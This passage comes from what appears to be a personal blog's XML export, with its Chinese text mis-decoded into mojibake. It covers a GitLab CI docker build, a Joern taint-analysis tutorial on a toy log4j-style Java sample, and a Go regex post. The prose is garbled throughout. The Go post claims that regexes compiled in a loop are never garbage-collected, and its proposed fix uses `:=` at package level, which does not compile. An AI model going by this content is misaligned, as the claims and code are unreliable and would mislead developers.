class="line">  <span class="comment"># å¤§å†™çš„ä½œä¸ºå˜é‡ç”¨$ç¬¦å·å¼•ç”¨</span></span><br><span class="line">      <span class="attr">DOCKER_TLS_CERTDIR:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="attr">GIT_STRATEGY:</span> <span class="string">none</span></span><br><span class="line">      <span class="comment">#è¿™é‡Œéœ€è¦æ–°å»ºä¸€ä¸ªhello-worldé¡¹ç›®åœ¨harborä¸­</span></span><br><span class="line">      <span class="attr">REPO:</span> <span class="string">hello-world/hello-world</span></span><br><span class="line">  <span class="attr">services:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">docker:dind</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;--registry-mirror&quot;</span>, <span class="string">&quot;https://xxxx.com&quot;</span>, <span class="string">&quot;--insecure-registry&quot;</span>, <span class="string">&quot;xxx.xxx.xxx.xxx:xxxx&quot;</span>]</span><br><span class="line">  <span class="attr">before_script:</span></span><br><span class="line">  <span class="comment"># dollar ç¬¦å·å¼€å¤´çš„æ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">$docker_password</span> <span class="string">|</span> <span class="string">docker</span> <span class="string">login</span> <span class="string">-u</span> <span class="string">$docker_username</span> <span class="string">--password-stdin</span> <span class="string">$docker_addr</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">  <span class="comment"># docker build -t image:tag Dockerfileæ‰€åœ¨ä½ç½®ï¼ˆæ„å»ºdockeré•œåƒï¼‰</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">$docker_addr/$REPO:latest</span> <span class="string">.</span></span><br><span class="line">  <span class="comment"># å°†docker pushåˆ°harborå¯¹åº”ä»“åº“</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">push</span> <span class="string">$docker_addr/$REPO:latest</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">dev</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><code>main.go</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>run.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/main</span><br></pre></td></tr></table></figure>

<p><code>Dockerfile</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> build/helloworld /main</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> run.sh /run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN  apk add --no-cache bash</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  chmod +x /main \</span></span><br><span class="line"><span class="bash">    &amp;&amp; chmod +x /run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>





<h2 id="æµæ°´çº¿2-æ‹‰dockerç§æœ‰ä»“åº“å·²ç»å­˜åœ¨çš„é•œåƒï¼Œè¿è¡Œ"><a href="#æµæ°´çº¿2-æ‹‰dockerç§æœ‰ä»“åº“å·²ç»å­˜åœ¨çš„é•œåƒï¼Œè¿è¡Œ" class="headerlink" title="æµæ°´çº¿2:æ‹‰dockerç§æœ‰ä»“åº“å·²ç»å­˜åœ¨çš„é•œåƒï¼Œè¿è¡Œ"></a>æµæ°´çº¿2:æ‹‰dockerç§æœ‰ä»“åº“å·²ç»å­˜åœ¨çš„é•œåƒï¼Œè¿è¡Œ</h2><p>å…¶å®ä¸Šä¸€ä¸ªå·²ç»åŒ…å«äº†è¿™ä¸ªï¼Œbuild goçš„é‚£ä¸ªå°±æ˜¯ï¼Œåªæ˜¯éœ€è¦æŒ‡å®šä¸€ä¸‹ç¯å¢ƒå˜é‡ç„¶åæ¥è®¿é—®ç§åº“ï¼Œåœ¨before_scriptä¸­æŒ‡å®šä¸€ä¸‹å°±å¥½</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>CI/CD</tag>
      </tags>
  </entry>
  <entry>
    <title>joernä½¿ç”¨(2)</title>
    <url>/2022/12/31/joern%E4%BD%BF%E7%94%A8-2/</url>
    <content><![CDATA[<p>ä»¥ä¸€ä¸ªå°ä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹joernè‡ªå®šä¹‰çš„è§„åˆ™ç”¨æ³•.</p>
<span id="more"></span>

<p>å®‰è£…å®Œæ¯•ä¹‹åè°ƒç”¨joernè¿™ä¸ªå‘½ä»¤,ä¼šè¿›å…¥åˆ°ä¸€ä¸ªäº¤äº’å¼çš„å‘½ä»¤è¡Œ,è€Œè¿™ä¸ªç•Œé¢å¯ä»¥é€æ­¥çš„äº¤äº’å¼åˆ†æ.</p>
<p>joernéœ€è¦åˆ†æä»£ç ,é¦–å…ˆéœ€è¦æºç (åºŸè¯,ç™½ç›’æ‰«çš„å°±æ˜¯æºç ),æˆ‘æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ä¸¤ä¸ªå‡½æ•°</p>
<ul>
<li><code>importCode</code> å­—é¢æ„ä¹‰,æ¥å—ä¸€ä¸ªè·¯å¾„,ä¼ å…¥çš„æ˜¯æºç çš„ç›¸å¯¹/ç»å¯¹è·¯å¾„</li>
<li><code>loadCpg</code>åŠ è½½å®ç°ç”Ÿæˆå¥½çš„cpgå›¾,éœ€è¦å…ˆæ ¹æ®ä»£ç ç”Ÿæˆcpgå›¾</li>
</ul>
<p>ç”Ÿæˆcpgå›¾çš„å‘½ä»¤<code>joern-parse &lt;path-to-src-code&gt; -o ./test_cpg.bin</code> (å½“ç„¶å¦‚æœä½ ç”¨çš„æ˜¯dockerç‰ˆæœ¬,éœ€è¦å…ˆæŠŠæºç ç›®å½•æŒ‚è½½è¿›å®¹å™¨,ç„¶ååˆ†æ)</p>
<p><code>-o</code>å‚æ•°å¯ä»¥ç”¨æ¥ä¿®æ”¹åˆ°å¤„çš„ä½ç½®å’Œåå­—,é»˜è®¤æƒ…å†µä¸‹æ˜¯cpg.binè¿™ä¸ªåå­—</p>
<h1 id="å¾…åˆ†ææºç "><a href="#å¾…åˆ†ææºç " class="headerlink" title="å¾…åˆ†ææºç "></a>å¾…åˆ†ææºç </h1><p>å°±ä»¥log4jé‚£ä¸ªæ¼æ´ä¸ºä¾‹å§</p>
<p>å‡è®¾æˆ‘ç°åœ¨æœ‰ä¸ªé¡¹ç›®å«åš<code>apache-log4j-test</code></p>
<p>åªæ˜¯ç®€å•çš„æ¼”ç¤ºç”¨æ³•,å½“ç„¶ä¸èƒ½ç›´æ¥ç”¨äºæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// log4j.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line"><span class="comment">//    private static final Logger logger = LogManager.getLogger(log4j.class);</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reading data using readLine</span></span><br><span class="line">        String name = reader.readLine();</span><br><span class="line"></span><br><span class="line">        Log4jRCE test = <span class="keyword">new</span> Log4jRCE();</span><br><span class="line">        test.recMe(name + <span class="string">&quot;here we go&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Log4jRCE.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jRCE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recMe</span><span class="params">(String text)</span></span>&#123;</span><br><span class="line">        logger.error(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜¾ç„¶,å½“æ—¶è¿™ä¸ªæ¼æ´çš„åŸå› å°±æ˜¯å› ä¸ºæ—¥å¿—å‡½æ•°ä¸­çš„å†…å®¹æ˜¯ç”¨æˆ·å¯æ§çš„.</p>
<p>å¯¹äºè¿™ä¸ªç¨‹åºè€Œè¨€,sinkç‚¹å°±æ˜¯<code>logger.error(text)</code>è¿™ä¸ªå‡½æ•°,è€Œsourceç‚¹å…¶å®å°±æ˜¯nameè¿™ä¸ªå€¼,å½“ç„¶è¿™é‡Œå…¶å®ä¹Ÿæ²¡æœ‰å¯æ§,æˆ‘ä»¬å‡è®¾ä»–æ˜¯ä¸€ä¸ªå¤–éƒ¨è¾“å…¥.</p>
<p>è€Œæ›´ä¸ºäº†ç®€å•èµ·è§,æˆ‘ä»¬å°±æŠŠsourceç‚¹è®¾ç½®ä¸ºâ€œæ‰€æœ‰å‡½æ•°çš„å…¥å‚â€,é‚£ä¹ˆè¿™ä¸ªnameæˆ‘ä»¬ä¸€å®šæ˜¯å¯ä»¥æ‹¿åˆ°çš„.</p>
<h1 id="äº¤äº’å¼ç¡®å®šsinkå’Œsoure"><a href="#äº¤äº’å¼ç¡®å®šsinkå’Œsoure" class="headerlink" title="äº¤äº’å¼ç¡®å®šsinkå’Œsoure"></a>äº¤äº’å¼ç¡®å®šsinkå’Œsoure</h1><p>è¿›å…¥äº¤äº’å¼å‘½ä»¤è¡Œ,é¦–å…ˆæˆ‘ä»¬å¯¼å…¥ä»£ç ,è®©joernä¸ºæˆ‘ä»¬ç”Ÿæˆå½“å‰ä»£ç çš„cpgå›¾</p>
<p><code>importCode(&#39;apache-log4j-test&#39;,&#39;test&#39;)</code></p>
<p>ç„¶åå¯ä»¥çœ‹çœ‹æˆ‘ä»¬éƒ½èƒ½è·å–åˆ°ä¸€äº›ä»€ä¹ˆç»“æœ</p>
<p>cpgä½œä¸ºä¸€ä¸ªå¯¹è±¡,è·å–çš„æ˜¯æ•´å¼ å›¾çš„ç»“æœ,æˆ‘ä»¬å¯ä»¥ç”¨<code>cpg.</code>ç„¶åæŒ‰tabé”®æ¥è·å–åˆ°cpgè¿™ä¸ªå¯¹è±¡æ‰€å«æœ‰å±æ€§å’Œæ–¹æ³•,è¿™äº›å±æ€§å’Œæ–¹æ³•çš„åå­—é€šå¸¸éå¸¸çš„ç›´è§‚æ˜“æ‡‚,è€Œå¦‚æœå‡ºç°äº†ä¸æ˜ç™½çš„,å¯ä»¥æœè¿™ä¸ªå®˜æ–¹æ–‡æ¡£ä¸­çš„<a href="https://docs.joern.io/cpgql/reference-card">è¯å…¸</a></p>
<p><code>cpg.call.toList</code> <code>cpg.method.toList</code></p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æœ€ååŠ ä¸ŠtoListåœ¨ç»ˆç«¯ä¸­æ‰“å°å‡ºæ¥,ç®€å†™ä¸ºl</p>
<p>å¸¸è§çš„ç”¨æ³•</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Usage</th>
</tr>
</thead>
<tbody><tr>
<td>Code string</td>
<td><code>cpg.call.code.l</code></td>
</tr>
<tr>
<td>Call name</td>
<td><code>cpg.call.name.l</code></td>
</tr>
<tr>
<td>Location</td>
<td><code>cpg.call.name(&quot;foo&quot;).location.l</code></td>
</tr>
<tr>
<td>Calling method</td>
<td><code>cpg.call.name(&quot;foo&quot;).method.l</code></td>
</tr>
<tr>
<td>Argument</td>
<td><code>cpg.call.name(&quot;foo&quot;).argument.code.l</code></td>
</tr>
<tr>
<td>Filter</td>
<td><code>cpg.call.filter(_.argument.code(&quot;42&quot;)).name.l</code></td>
</tr>
</tbody></table>
<p>ç„¶åä½¿ç”¨ä¸€ä¸ªæ–¹æ³•è·å–åˆ°äº†sinkç‚¹ <code>cpg.call.methodFullName(&quot;org.apache.logging.log4j.Logger.error.*&quot;).l</code></p>
<p>åŒæ ·çš„è·å–åˆ°äº†ç®€åŒ–çš„sourceç‚¹ <code>cpg.method.parameter</code>ç®€å• ç²—æš´çš„è·å–æ‰€æœ‰çš„æ–¹æ³•å‚æ•°.</p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥æŠŠå®ƒå®šä¹‰ä¸€ä¸‹,ä½¿ç”¨defè¿™å…³é”®è¯,è¿™æ˜¯Scalaä¸­å®šä¹‰å‡½æ•°ç”¨çš„</p>
<p>åœ¨ç»ˆç«¯ä¸­ä¾æ¬¡æ‰§è¡Œ.</p>
<p><code> def sink = cpg.call.methodFullName(&quot;org.apache.logging.log4j.Logger.error.*&quot;)</code><br><code> def source = cpg.method.parameter</code></p>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯ä¸­å€ŸåŠ©joernçš„å¼•æ“å¸®æˆ‘ä»¬è¿›è¡Œæ±¡ç‚¹åˆ†æäº†.</p>
<p>æ‰§è¡Œ</p>
<p><code>sink.reachableByFlows(source).l</code></p>
<p>ç„¶åå°±ä¼šè¾“å‡ºæˆ‘ä»¬è¦çš„sourceç‚¹åˆ°sinkç‚¹çš„ç»è¿‡çš„æ¯ä¸€æ­¥.</p>
<p>è¿™é‡Œè¿˜æœ‰ä¸€äº›å°tips,æ¯”å¦‚å¯ä»¥åœ¨äº¤äº’å¼å‘½ä»¤è¡Œä¸­ç›´æ¥è®©joernå¼¹å‡ºä»¥å½“å‰è¿™ä¸ªèŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„ast,cfgç­‰å›¾,ä»¥å¯è§†åŒ–çš„å½¢å¼å¼¹å‡º,æ–¹ä¾¿æˆ‘ä»¬ä¾¿åˆ©</p>
<p><code>cpg.method.name(&quot;xxx&quot;).plot[xxx]</code></p>
<h1 id="è„šæœ¬åŒ–"><a href="#è„šæœ¬åŒ–" class="headerlink" title="è„šæœ¬åŒ–"></a>è„šæœ¬åŒ–</h1><p>é€šè¿‡äº¤äº’å¼å»é€æ­¥ç¡®å®šåªé€‚åˆæˆ‘ä»¬æµ‹è¯•æˆ–è€…debugçš„æ—¶å€™,å½“æˆ‘å·²ç»å®Œæˆäº†ä¸€ä¸ªsinkå’Œsourceçš„ç¡®å®šä¹‹å,æˆ‘å¸Œæœ›å¿«é€Ÿçš„è¿›è¡Œæ±¡ç‚¹åˆ†æ,joernä¹Ÿæä¾›äº†ç±»ä¼¼çš„æ”¯æŒ.</p>
<p>è¿™æ¬¡æˆ‘ä»¬è¦æŠŠåˆšåˆšçš„è§„åˆ™,è¿›è¡Œè„šæœ¬åŒ–</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.sc</span></span><br><span class="line"><span class="meta">@main</span> <span class="function"><span class="keyword">def</span> <span class="title">exec</span></span>(outFile:<span class="type">String</span>) = &#123;</span><br><span class="line">   importCode(<span class="string">&quot;apache-log4j-test&quot;</span>,<span class="string">&quot;log4j-test&quot;</span>)</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">sink</span> </span>= cpg.call.methodFullName(<span class="string">&quot;org.apache.logging.log4j.Logger.error.*&quot;</span>)</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">source</span> </span>= cpg.method.parameter</span><br><span class="line">   sink.reachableByFlows(source).toJson |&gt; outFile</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•,è¿™é‡Œä»…ä»…æ˜¯æŠŠä¸Šé¢çš„å‘½ä»¤ä¸²äº†èµ·æ¥,å¹¶ä¸”å¤šäº†ä¸€ä¸ªtoJsonè¾“å‡º,å¯ä»¥è®©æˆ‘ä»¬ä»¥jsonæ–‡ä»¶çš„å½¢å¼æŸ¥çœ‹ç»“æœ,è€Œç»“æœæ–‡ä»¶æ˜¯ç”±å¤–éƒ¨ä¼ å…¥çš„,æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è¿è¡Œè„šæœ¬.</p>
<p> <code> joern --script test.sc --params outFile=output.json</code></p>
<p>è¿™æ ·æˆ‘ä»¬çš„output.jsonå°±å¯ä»¥æ‹¿åˆ°jsonçš„ç»“æœäº†.</p>
<p>å¥½äº†åˆ°äº†è¿™,æ€»ç®—æŠŠè¿™ä¸ªä½¿ç”¨joernè¿›è¡Œsastæ±¡ç‚¹åˆ†æçš„æµç¨‹è®²æ¸…æ¥šäº†,è™½ç„¶è¿™ä¸ªä¾‹å­éå¸¸çš„æ„šè ¢(å› ä¸ºæ˜¯log4jçš„pocæ”¹çš„,æ‡’å¾—å†™äº†),ä¸ä»…æ²¡æœ‰åˆ¤æ–­æ˜¯å¦ä¸ºçœŸå®çš„å…¥å‚,ç›´æ¥æš´åŠ›æŒ‡å®šæ‰€æœ‰å‡½æ•°çš„å…¥å‚éƒ½æ˜¯source, è€Œsinkç‚¹ä¹Ÿåªæ˜¯é’ˆå¯¹ä¸€ä¸ªå…·ä½“çš„æ¼æ´,å¹¶ä¸æ˜¯é€šç”¨çš„æ–¹æ³•,ç”šè‡³è¿™ä¸ªå…·ä½“çš„æ¼æ´è¿˜è·Ÿlog4jçš„ç»„ä»¶ç‰ˆæœ¬æœ‰å…³ç³».</p>
<p>ä½†è¿™å¹¶ä¸å¦¨ç¢æˆ‘ä»¬å¿«é€Ÿçš„ç†Ÿæ‚‰å’Œä¸Šæ‰‹joernè¿™ä¸ªå·¥å…·,æœ‰å®é™…åº”ç”¨ä»·å€¼çš„sastè§„åˆ™å› ä¸ºæ˜¯é€šç”¨çš„,æ‰€ä»¥éœ€è¦è€ƒè™‘çš„æƒ…å†µä¼šæ¯”è¿™ä¸ªç®€é™‹çš„ä¾‹å­å¤šå¾ˆå¤š. è™½ç„¶ç®€å•å®ç”¨æ— éœ€è¾ƒå¤šçš„Scalaçš„ç›¸å…³è¯­æ³•çŸ¥è¯†,ä½†æ·±å…¥ä½¿ç”¨æ˜¾ç„¶æ˜¯éœ€è¦ä¸€äº›åŸºæœ¬è¯­æ³•çš„. joernçš„å®˜æ–¹æ–‡æ¡£è¿˜ç®—ä¸é”™,æ”¹å†™çš„éƒ½å†™äº†,è™½ç„¶ä¸æ˜¯å¾ˆè¯¦ç»†å’Œé›¶æ•£,ä½†æ€»ä½“æ¥è¯´ä¸é”™,å¦‚æœå¯¹Scalaè¯­æ³•å¤§è‡´æœ‰äº†è§£ä¹‹å,å¹¶ä¸”äº†è§£joernçš„DSLçš„å¤§è‡´å®ç°ä¹‹åå†å»ä½¿ç”¨ä¸€äº›é«˜çº§åŠŸèƒ½,å¯èƒ½ä¼šæ›´åŠ å¾—å¿ƒåº”æ‰‹.</p>
<h1 id="dockerçš„æƒ…å†µ"><a href="#dockerçš„æƒ…å†µ" class="headerlink" title="dockerçš„æƒ…å†µ"></a>dockerçš„æƒ…å†µ</h1><p>å› ä¸ºdockerè¿˜æ¶‰åŠåˆ°äº†æ–‡ä»¶è·¯å¾„çš„æŒ‚è½½,æ‰€ä»¥å‘½ä»¤çœ‹èµ·æ¥ä¼šæ¯”è¾ƒç¹ç,æ€è·¯ä¸ä¸Šè¿°å®Œå…¨ä¸€è‡´</p>
<p>æŒ‚è½½éœ€è¦åˆ†æçš„æºç ç›®å½•è‡³ /test</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run  -it --rm -v  $PWD/apache-log4j-test:/test joern /bin/bash /opt/joern/joern-cli/joern</span><br></pre></td></tr></table></figure>

<p>å³è¿›å…¥joernçš„äº¤äº’å¼ç•Œé¢</p>
<p>ç„¶åå¯¼å…¥ä»£ç <code>importCode(&quot;/test&quot;,&quot;test&quot;)</code>ç„¶åå°±èƒ½è¿›è¡Œåˆ†æ</p>
<ul>
<li>joern-parse</li>
</ul>
<p>joern-parse -o æŒ‡å®šè¾“å‡ºæ–‡ä»¶ç›®å½•ï¼ˆæ”¾åˆ°æŒ‚è½½ç›®å½•ä¸­ï¼Œæ–¹ä¾¿æœ¬åœ°åˆ†æï¼‰</p>
<p><code>docker run  -it --rm -v  $PWD/apache-log4j-test:/test joern /bin/bash /opt/joern/joern-cli/bin/joern-parse /test -o /test/log4j_cpg.bin</code></p>
<p>å¯¹äºä¸€ä¸ªé¡¹ç›®ç”Ÿæˆä¸€æ¬¡cpgä¹‹åï¼Œå³å¯åœ¨äº¤äº’å¼ä¸­<code>loadCpg(&quot;cpgåç§°&quot;)</code>æ¥å¯¼å…¥å›¾ï¼Œè¿›è¡Œè¿›ä¸€æ­¥åˆ†æ</p>
<ul>
<li>æ‰§è¡Œè„šæœ¬</li>
</ul>
<p>åŒä¸Š æ‰§è¡Œè„šæœ¬ï¼Œéœ€è¦<strong>æ³¨æ„importCodeæˆ–è€…loadCpgéœ€è¦æŒ‡å®šä¸ºæ­£ç¡®çš„è·¯å¾„</strong></p>
<p><code>docker run  -it --rm -v  $PWD/apache-log4j-test:/test joern /bin/bash /opt/joern/joern-cli/joern --script /test/test.sc --params outFile=/test/output.json</code></p>
]]></content>
      <categories>
        <category>joern</category>
      </categories>
      <tags>
        <tag>é™æ€åˆ†æ</tag>
      </tags>
  </entry>
  <entry>
    <title>goæ­£åˆ™çš„å‘</title>
    <url>/2021/12/19/go%E6%AD%A3%E5%88%99%E7%9A%84%E5%9D%91/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸ºå•¥ä¼šæœ‰è¿™ç¯‡åšå®¢å‘¢ï¼Œå› ä¸ºæˆ‘åœ¨ä¸€ä¸ªå‘é‡Œé¢æ‰äº†ä¸¤æ¬¡â€¦</p>
<p>è¿™ä¸¤å‘¨åœ¨å®ä¹ ï¼Œè¿˜ç®—æ˜¯é€‚åº”ï¼Œä½“ä¼šå°±æ˜¯è‡ªå·±çœŸçš„å¤ªèœäº†â€¦.å¤§ä½¬äº‘é›†</p>
<p>ç‰¹åˆ«æ˜¯æºç çš„å‡çº§å’Œè¿½è¸ªæ–¹é¢ï¼Œè®°å½•ä¸€ä¸‹ç¬¬äºŒæ¬¡é‡åˆ°è¿™ä¸ªé—®é¢˜</p>
<p>mentorè·Ÿæˆ‘è¯´çš„æ—¶å€™è¿™æ˜¯è¡€çš„æ•™è®­ï¼Œè·‘æœåŠ¡çš„æ—¶å€™è·‘ç€è·‘ç€å†…å­˜ç‚¸äº†ï¼Œæœ€åå‘ç°æ˜¯æ­£åˆ™çš„é—®é¢˜</p>
<span id="more"></span>

<h3 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h3><p>æ­£å¸¸ä½¿ç”¨æ­£åˆ™çš„ä¾‹å­ï¼Œ</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å› ä¸ºç«‹é©¬mainå‡½æ•°å°±ç»“æŸäº†ï¼Œé‡Šæ”¾äº†è¿™ä¸ªgoè¿›ç¨‹ï¼Œä½†æ˜¯å¦‚æœä¸€ç›´å¾ªç¯è°ƒç”¨è¿™ä¸ªæ­£åˆ™ï¼Œæ¯”å¦‚å¾ªç¯</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++&#123;</span><br><span class="line">            r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line">    		fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åœ¨forå¾ªç¯ä¸­ä¸æ–­çš„æ­£åˆ™Compileå°±ä¼šä¸æ–­å¯¹rè¿›è¡Œèµ‹å€¼ï¼Œä½†æ˜¯goä¸ä¼šå¯¹ä¹‹å‰çš„æ–°å»ºå†…å­˜è¿›è¡Œgcâ€¦ç„¶åå°±ä¸æ–­ç´¯åŠ å†…å­˜æœ€åç‚¸äº†â€¦</p>
<p>ä¹Ÿå°±æ˜¯ä¼ è¯´ä¸­çš„ï¼Œå†…å­˜æ³„æ¼</p>
<h3 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h3><p>æ‰€ä»¥å¦‚æœè¦è¢«å¤šæ¬¡è°ƒç”¨æ­£åˆ™çš„æ—¶å€™ï¼Œéœ€è¦å°†è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æå‡º</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½œä¸ºå…¨å±€å˜é‡æå‡ºï¼Œä¸ä¼šæ¯æ¬¡è¿›è¡Œåˆå§‹åŒ–å ç”¨å†…å­˜</span></span><br><span class="line">r, _ := regexp.Compile(<span class="string">&quot;p([a-z]+)ch&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++&#123;</span><br><span class="line">    		fmt.Println(r.MatchString(<span class="string">&quot;peach&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h3><p>è¿‡ä¸€è¿‡äºŒä¸è¿‡ä¸‰â€¦</p>
]]></content>
      <tags>
        <tag>æ‚</tag>
      </tags>
  </entry>
  <entry>
    <title>linux ibusæ¶æ„è¾“å…¥æ³•ä¸­æ–‡è¾“å…¥é—®é¢˜</title>
    <url>/2022/02/20/linux-ibus%E6%9E%B6%E6%9E%84%E8%BE%93%E5%85%A5%E6%B3%95%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>ubuntué»˜è®¤çš„ä¸­æ–‡è¾“å…¥æ³•ä¸ºibusæ¶æ„çš„ï¼Œjetbrainå…¨å®¶æ¡¶åœ¨è¾“å…¥ä¸­æ–‡çš„æ—¶å€™ä¼šæœ‰é—®é¢˜</p>
<p>ä½†æœ‰çš„æ—¶å€™åˆæ‡’å¾—æŠ˜è…¾rimeè¾“å…¥æ³•ï¼Œå¥½å¤šè½¯ä»¶é»˜è®¤çš„å°±æ˜¯fcitx</p>
<span id="more"></span>

